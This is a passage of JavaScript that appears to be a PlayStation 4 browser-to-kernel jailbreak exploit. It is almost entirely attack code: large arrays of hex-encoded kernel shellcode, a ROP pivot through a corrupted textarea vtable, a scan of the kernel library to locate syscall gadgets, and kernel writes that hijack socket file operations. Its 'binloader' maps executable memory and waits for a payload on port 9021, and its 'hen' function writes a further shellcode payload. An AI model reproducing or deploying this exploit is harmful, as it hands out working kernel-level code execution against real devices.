  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
}

function binloader() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
    payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
    payload_loader = p.malloc32(0x1000);

    var loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;

    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(window.gadgets["pop rdi"]);
      new_thr.push(payload_buffer);
      new_thr.push(payload_loader);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
    document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021";
  
}

function hen() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

												   
											 
						 
	 
				 
				   
										  
	 
				   
										   
	 
				   
										   
	 
													 
							   
										
						
					
   
  
												 
											 
   
  
  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
 
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  payload_writer = p.array_from_address(payload_buffer, 0xC0000);

  payload_writer[0] = 0x000206E9;
  payload_writer[1] = 0xC0314800;
  payload_writer[2] = 0x0FCA8949;
  payload_writer[3] = 0xC3017205;
  payload_writer[4] = 0x703D8348;
  payload_writer[5] = 0x00000022;
  payload_writer[6] = 0xFF501874;
  payload_writer[7] = 0x00226715;
  payload_writer[8] = 0x08895900;
  payload_writer[9] = 0xFFC0C748;
  payload_writer[10] = 0x48FFFFFF;
  payload_writer[11] = 0xFFFFC2C7;
  payload_writer[12] = 0x55C3FFFF;
  payload_writer[13] = 0x48FA8948;
  payload_writer[14] = 0x0200EC81;
  payload_writer[15] = 0x8D480000;
  payload_writer[16] = 0x001FD335;
  payload_writer[17] = 0xE5894800;
  payload_writer[18] = 0x8948C031;
  payload_writer[19] = 0x4D15FFEF;
  payload_writer[20] = 0x48000022;
  payload_writer[21] = 0xDEBFEE89;
  payload_writer[22] = 0xFF000000;
  payload_writer[23] = 0x00221F15;
  payload_writer[24] = 0xC4814800;
  payload_writer[25] = 0x00000200;
  payload_writer[26] = 0x5741C35D;
  payload_writer[27] = 0x55415641;
  payload_writer[28] = 0x53555441;
  payload_writer[29] = 0x18EC8348;
  payload_writer[30] = 0x08478B48;
  payload_writer[31] = 0xB9F18949;
  payload_writer[32] = 0xC0000082;
  payload_writer[33] = 0x48408B4C;
  payload_writer[34] = 0x40708B48;
  payload_writer[35] = 0xC148320F;
  payload_writer[36] = 0x094820E2;
  payload_writer[37] = 0x518B49D0;
  payload_writer[38] = 0x228B4C08;
  payload_writer[39] = 0x086A8B4C;
  payload_writer[40] = 0x0FE4854D;
  payload_writer[41] = 0x00015084;
  payload_writer[42] = 0xFD834900;
  payload_writer[43] = 0x46860F07;
  payload_writer[44] = 0x48000001;
  payload_writer[45] = 0xFE40A88D;
  payload_writer[46] = 0x8D4CFFFF;
  payload_writer[47] = 0x3E16E0B0;
  payload_writer[48] = 0xB88D4C00;
  payload_writer[49] = 0x022C50A8;
  payload_writer[50] = 0xB8988D48;
  payload_writer[51] = 0x4800D09D;
  payload_writer[52] = 0x414458B8;
  payload_writer[53] = 0x41594C4F;
  payload_writer[54] = 0x04394950;
  payload_writer[55] = 0x16850F24;
  payload_writer[56] = 0x48000001;
  payload_writer[57] = 0x0118868B;
  payload_writer[58] = 0xC7480000;
  payload_writer[59] = 0x00000446;
  payload_writer[60] = 0x46C70000;
  payload_writer[61] = 0x00000014;
  payload_writer[62] = 0x13B94800;
  payload_writer[64] = 0xC7380100;
  payload_writer[66] = 0x858B4800;
  payload_writer[67] = 0x0113E398;
  payload_writer[68] = 0x30468948;
  payload_writer[69] = 0x50858B48;
  payload_writer[70] = 0x49022C57;
  payload_writer[71] = 0x49204089;
  payload_writer[72] = 0x48184089;
  payload_writer[73] = 0x0130878B;
  payload_writer[74] = 0xC7480000;
  payload_writer[75] = 0xFFFF6040;
  payload_writer[76] = 0x8948FFFF;
  payload_writer[77] = 0xC7485848;
  payload_writer[78] = 0xFFFF6840;
  payload_writer[79] = 0x0F41FFFF;
  payload_writer[80] = 0x894CC020;
  payload_writer[81] = 0x44894CC0;
  payload_writer[82] = 0x25480824;
  payload_writer[83] = 0xFFFEFFFF;
  payload_writer[84] = 0xC7C0220F;
  payload_writer[85] = 0x5016FA85;
  payload_writer[87] = 0xC7F63100;
  payload_writer[88] = 0x50296C85;
  payload_writer[90] = 0xDF894800;
  payload_writer[91] = 0xE88085C7;
  payload_writer[92] = 0xC031006B;
  payload_writer[93] = 0x00BA90C3;
  payload_writer[94] = 0xC7000040;
  payload_writer[95] = 0x66827085;
  payload_writer[96] = 0xC301B000;
  payload_writer[97] = 0xA085C790;
  payload_writer[98] = 0xB0006682;
  payload_writer[99] = 0xFF90C301;
  payload_writer[100] = 0x00210315;
  payload_writer[101] = 0xEA894C00;
  payload_writer[102] = 0x48E6894C;
  payload_writer[103] = 0x15FFDF89;
  payload_writer[104] = 0x000020D4;
  payload_writer[105] = 0x18E785C6;
  payload_writer[106] = 0x4AEB003E;
  payload_writer[107] = 0xFF2B948D;
  payload_writer[108] = 0x4800003F;
  payload_writer[109] = 0x8148DE89;
  payload_writer[110] = 0xFFC000E2;
  payload_writer[111] = 0xE68148FF;
  payload_writer[112] = 0xFFFFC000;
  payload_writer[113] = 0x000007B9;
  payload_writer[114] = 0xFF894C00;
  payload_writer[115] = 0xC6D6FF41;
  payload_writer[116] = 0x3E18E785;
  payload_writer[117] = 0x8B4C7500;
  payload_writer[118] = 0x41082444;
  payload_writer[119] = 0x49C0220F;
  payload_writer[120] = 0x08245C03;
  payload_writer[121] = 0x18C48348;
  payload_writer[122] = 0x8948C031;
  payload_writer[123] = 0x415D5BDA;
  payload_writer[124] = 0x415D415C;
  payload_writer[125] = 0xFF5F415E;
  payload_writer[126] = 0xC48348E2;
  payload_writer[127] = 0xFFC88318;
  payload_writer[128] = 0x5C415D5B;
  payload_writer[129] = 0x5E415D41;
  payload_writer[130] = 0x41C35F41;
  payload_writer[131] = 0xEC834854;
  payload_writer[132] = 0x00E9E810;
  payload_writer[133] = 0x62E80000;
  payload_writer[134] = 0x48000001;
  payload_writer[135] = 0x01EA058D;
  payload_writer[136] = 0x89480000;
  payload_writer[137] = 0x058B2404;
  payload_writer[138] = 0x00001DE8;
  payload_writer[139] = 0x24448948;
  payload_writer[140] = 0xFFC03108;
  payload_writer[141] = 0x00204F15;
  payload_writer[142] = 0xE6894800;
  payload_writer[143] = 0x273D8D48;
  payload_writer[144] = 0xC7FFFFFE;
  payload_writer[146] = 0x0073E800;
  payload_writer[147] = 0xC0850000;
  payload_writer[148] = 0x74C48941;
  payload_writer[149] = 0xFFC0310B;
  payload_writer[150] = 0x00202B15;
  payload_writer[151] = 0x208B4400;
  payload_writer[152] = 0xB43D8D48;
  payload_writer[153] = 0xE800001D;
  payload_writer[154] = 0x00000049;
  payload_writer[155] = 0xBE3D8D48;
  payload_writer[156] = 0xE800001D;
  payload_writer[157] = 0x0000003D;
  payload_writer[158] = 0x0001FFBE;
  payload_writer[159] = 0x3D8D4800;
  payload_writer[160] = 0x00001D97;
  payload_writer[161] = 0x000044E8;
  payload_writer[162] = 0x01FFBE00;
  payload_writer[163] = 0x8D480000;
  payload_writer[164] = 0x001D9C3D;
  payload_writer[165] = 0x0033E800;
  payload_writer[166] = 0x3AE80000;
  payload_writer[167] = 0x48000001;
  payload_writer[168] = 0x1DAA3D8D;
  payload_writer[169] = 0x88E80000;
  payload_writer[170] = 0x48FFFFFD;
  payload_writer[171] = 0x4410C483;
  payload_writer[172] = 0x5C41E089;
  payload_writer[173] = 0xC0C748C3;
  payload_writer[174] = 0x0000000A;
  payload_writer[175] = 0xFFFD47E9;
  payload_writer[176] = 0xC0C748FF;
  payload_writer[177] = 0x0000000B;
  payload_writer[178] = 0xFFFD3BE9;
  payload_writer[179] = 0xC0C748FF;
  payload_writer[180] = 0x00000088;
  payload_writer[181] = 0xFFFD2FE9;
  payload_writer[182] = 0xC0C748FF;
  payload_writer[183] = 0x0000024F;
  payload_writer[184] = 0xFFFD23E9;
  payload_writer[185] = 0xF18948FF;
  payload_writer[186] = 0x8948D231;
  payload_writer[187] = 0xC03145FE;
  payload_writer[188] = 0x0252BF50;
  payload_writer[189] = 0xC0310000;
  payload_writer[190] = 0xFFFD08E8;
  payload_writer[191] = 0x55C35AFF;
  payload_writer[192] = 0x623D8D48;
  payload_writer[193] = 0x4800001D;
  payload_writer[194] = 0x4810EC83;
  payload_writer[195] = 0x1F7205C7;
  payload_writer[197] = 0x8D480000;
  payload_writer[198] = 0x480C246C;
  payload_writer[199] = 0xC2E8EE89;
  payload_writer[200] = 0x85FFFFFF;
  payload_writer[201] = 0x482274C0;
  payload_writer[202] = 0x8D48EE89;
  payload_writer[203] = 0x001D473D;
  payload_writer[204] = 0xFFAFE800;
  payload_writer[205] = 0xC085FFFF;
  payload_writer[206] = 0x89480F74;
  payload_writer[207] = 0x3D8D48EE;
  payload_writer[208] = 0x00001D47;
  payload_writer[209] = 0xFFFF9CE8;
  payload_writer[210] = 0x247C8BFF;
  payload_writer[211] = 0x158D480C;
  payload_writer[212] = 0x00001F34;
  payload_writer[213] = 0x43358D48;
  payload_writer[214] = 0xE800001D;
  payload_writer[215] = 0xFFFFFF79;
  payload_writer[216] = 0x0C247C8B;
  payload_writer[217] = 0x25158D48;
  payload_writer[218] = 0x4800001F;
  payload_writer[219] = 0x1D34358D;
  payload_writer[220] = 0x62E80000;
  payload_writer[221] = 0x48FFFFFF;
  payload_writer[222] = 0x5D10C483;
  payload_writer[223] = 0x314555C3;
  payload_writer[224] = 0xC03145C9;
  payload_writer[225] = 0xD231C931;
  payload_writer[226] = 0x8D48F631;
  payload_writer[227] = 0x001D2E3D;
  payload_writer[228] = 0xF915FF00;
  payload_writer[229] = 0x4800001E;
  payload_writer[230] = 0x1EFA158D;
  payload_writer[231] = 0x8D480000;
  payload_writer[232] = 0x001D3235;
  payload_writer[233] = 0x89C58900;
  payload_writer[234] = 0xFF2BE8C7;
  payload_writer[235] = 0xEF89FFFF;
  payload_writer[236] = 0xC1158D48;
  payload_writer[237] = 0x4800001E;
  payload_writer[238] = 0x1D20358D;
  payload_writer[239] = 0x16E80000;
  payload_writer[240] = 0x89FFFFFF;
  payload_writer[241] = 0x8D485DEF;
  payload_writer[242] = 0x001ED315;
  payload_writer[243] = 0x358D4800;
  payload_writer[244] = 0x00001D11;
  payload_writer[245] = 0xFFFF00E9;
  payload_writer[246] = 0x31C931FF;
  payload_writer[247] = 0x48F631D2;
  payload_writer[248] = 0x1D073D8D;
  payload_writer[249] = 0x31450000;
  payload_writer[250] = 0x314550C9;
  payload_writer[251] = 0x9D15FFC0;
  payload_writer[252] = 0x5900001E;
  payload_writer[253] = 0x85158D48;
  payload_writer[254] = 0x8900001E;
  payload_writer[255] = 0x358D48C7;
  payload_writer[256] = 0x00001D0F;
  payload_writer[257] = 0xFFFED0E9;
  payload_writer[258] = 0x000000FF;
  payload_writer[259] = 0x4F414458;
  payload_writer[260] = 0x5041594C;
  payload_writer[261] = 0x00000EE8;
  payload_writer[263] = 0x75083F83;
  payload_writer[264] = 0x18478B4A;
  payload_writer[265] = 0xE9C1C189;
  payload_writer[266] = 0x89407518;
  payload_writer[267] = 0x00E281C2;
  payload_writer[268] = 0x81000C00;
  payload_writer[269] = 0x0C0000FA;
  payload_writer[270] = 0x81307500;
  payload_writer[271] = 0x1337387F;
  payload_writer[272] = 0x27750000;
  payload_writer[273] = 0xFBFFFF25;
  payload_writer[274] = 0x0D8D48FF;
  payload_writer[275] = 0x000016EB;
  payload_writer[276] = 0x31184789;
  payload_writer[277] = 0xC28948C0;
  payload_writer[278] = 0x8ADAF748;
  payload_writer[279] = 0x54880A14;
  payload_writer[280] = 0xFF483807;
  payload_writer[281] = 0xF88348C0;
  payload_writer[282] = 0xFFEA7510;
  payload_writer[283] = 0x001BFB25;
  payload_writer[284] = 0x41574100;
  payload_writer[285] = 0x41554156;
  payload_writer[286] = 0x48535554;
  payload_writer[287] = 0x4928EC83;
  payload_writer[288] = 0x8949FC89;
  payload_writer[289] = 0x48D389F5;
  payload_writer[290] = 0x4C65CD89;
  payload_writer[291] = 0x0025348B;
  payload_writer[292] = 0x4C000000;
  payload_writer[293] = 0x0C247C8D;
  payload_writer[294] = 0x000014BA;
  payload_writer[295] = 0xFF894C00;
  payload_writer[296] = 0x15FFF631;
  payload_writer[297] = 0x00001C84;
  payload_writer[298] = 0x0C245C89;
  payload_writer[299] = 0x247C8D48;
  payload_writer[300] = 0xEE894C10;
  payload_writer[301] = 0x000010BA;
  payload_writer[302] = 0x7515FF00;
  payload_writer[303] = 0x4800001C;
  payload_writer[304] = 0x1BFE358B;
  payload_writer[305] = 0x894C0000;
  payload_writer[306] = 0xFFD231F7;
  payload_writer[307] = 0x001C7315;
  payload_writer[308] = 0xE1894C00;
  payload_writer[309] = 0x48FE894C;
  payload_writer[310] = 0xB841EF89;
  payload_writer[311] = 0x00000020;
  payload_writer[312] = 0x000014BA;
  payload_writer[313] = 0x9915FF00;
  payload_writer[314] = 0x4800001B;
  payload_writer[315] = 0x1BD2358B;
  payload_writer[316] = 0x894C0000;
  payload_writer[317] = 0x4115FFF7;
  payload_writer[318] = 0x4800001C;
  payload_writer[319] = 0x5B28C483;
  payload_writer[320] = 0x415C415D;
  payload_writer[321] = 0x415E415D;
  payload_writer[322] = 0x5741C35F;
  payload_writer[323] = 0x55415641;
  payload_writer[324] = 0x53555441;
